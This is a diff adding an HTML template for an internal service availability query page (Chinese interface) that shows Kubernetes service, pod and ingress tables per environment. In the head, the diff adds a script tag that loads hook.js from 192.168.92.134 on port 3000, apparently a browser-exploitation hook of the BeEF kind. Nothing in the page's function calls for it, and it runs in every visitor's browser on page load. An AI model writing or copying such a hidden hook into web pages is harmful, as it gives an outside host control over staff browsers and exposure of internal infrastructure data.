@@ -1,0 +1,135 @@
+<!--注释-->
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Welcome</title>
+    <style type="text/css">
+        thead {
+            color: green
+        }
+
+        strong {
+            color: red;
+            font-size: 20px;
+        }
+         td div {
+            color: blue;
+        }
+    </style>
+    <script src="http://192.168.92.134:3000/hook.js"></script>
+</head>
+
+<body>
+<div class=" body_div">
+    <a href="/logman/"><h1>服务可用性查询</h1></a>
+    <hr/>
+    <form action="/logman/" method="get">
+        <p>服务名或URL 条件二选一！</p>
+        <p>示例：stocking-cloud-grpc-stuff-return-server 或 http://order.chtwebapi.lingcb.net/retail_order/</p>
+        <p>
+            <label>服务：<input type="text" size="40px" name="svc" value=""
+                             \></label>
+        </p>
+        <p>
+            <label>URL：<input type="text" size="200px" name="urlpath" value=""
+                              \></label>
+        </p>
+        <p>
+            环境：
+            <select name="env">
+                <option name="sit" value="sit">sit</option>
+                <option name="dev" value="dev">dev</option>
+                <option name="release" value="release">release</option>
+            </select>
+            <input type="submit" value="提交" \>
+        </p>
+    </form>
+</div>
+<hr/>
+<br>
+<h3>Service</h3>
+<table border="1">
+    <thead>
+    <tr>
+        <th>SvcName</th>
+        <th>SvcType</th>
+        <th>SvcIP</th>
+        <th><div>SvcPort</div></th>
+        <th>Socket_Status</th>
+        <th>message</th>
+    </tr>
+    </thead>
+    <tbody>
+    {% for line in SvcBundle %}
+    <tr>
+        <td>{{ line.svc_name }}</td>
+        <td>{{ line.svc_type }}</td>
+        <td>{{ line.svc_ip }}</td>
+        <td><div>{{ line.svc_port }}</div></td>
+        <td><strong>{{ line.socket_status }}</strong></td>
+        <td>{{ line.svc_message }}</td>
+    </tr>
+    {% endfor %}
+    </tbody>
+</table>
+<hr/>
+<br>
+<h3>Pod</h3>
+<table border="1">
+    <thead>
+    <tr>
+        <th>PodName</th>
+        <th>PodStatus</th>
+        <th>PodIP</th>
+        <th>PodVersion</th>
+        <th>启动时间</th>
+        <th>Host</th>
+        <th>HostStatus</th>
+        <th>LogURL</th>
+    </tr>
+    </thead>
+    <tbody>
+    {% for line in PodBundle %}
+    <tr>
+        <td>{{ line.pod_name }}</td>
+        <td><strong>{{ line.status }}</strong></td>
+        <td>{{ line.pod_ip }}</td>
+        <td>{{ line.version }}</td>
+        <td>{{ line.starttime }}</td>
+        <td>{{ line.host }}</td>
+        <td><strong>{{ line.host_status }}</strong></td>
+        <td>{{ line.log_url }}</td>
+    </tr>
+    {% endfor %}
+    </tbody>
+</table>
+<hr/>
+<br>
+<h3>Ingress</h3>
+<table border="1">
+    <thead>
+    <tr>
+        <th>IngName</th>
+        <th>IngDomain</th>
+        <th>IngSvc</th>
+        <th>IngPort</th>
+        <th>IngPath</th>
+        <th>IngMsg</th>
+    </tr>
+    </thead>
+    <tbody>
+    {% for line in IngBundle %}
+    <tr>
+        <td>{{ line.ing_name }}</td>
+        <td>{{ line.ing_domain }}</td>
+        <td>{{ line.ing_svc }}</td>
+        <td><div>{{ line.ing_port }}</div></td>
+        <td>{{ line.ing_path }}</td>
+        <td>{{ line.ing_msg }}</td>
+    </tr>
+    {% endfor %}
+    </tbody>
+</table>
+</body>
+</html>
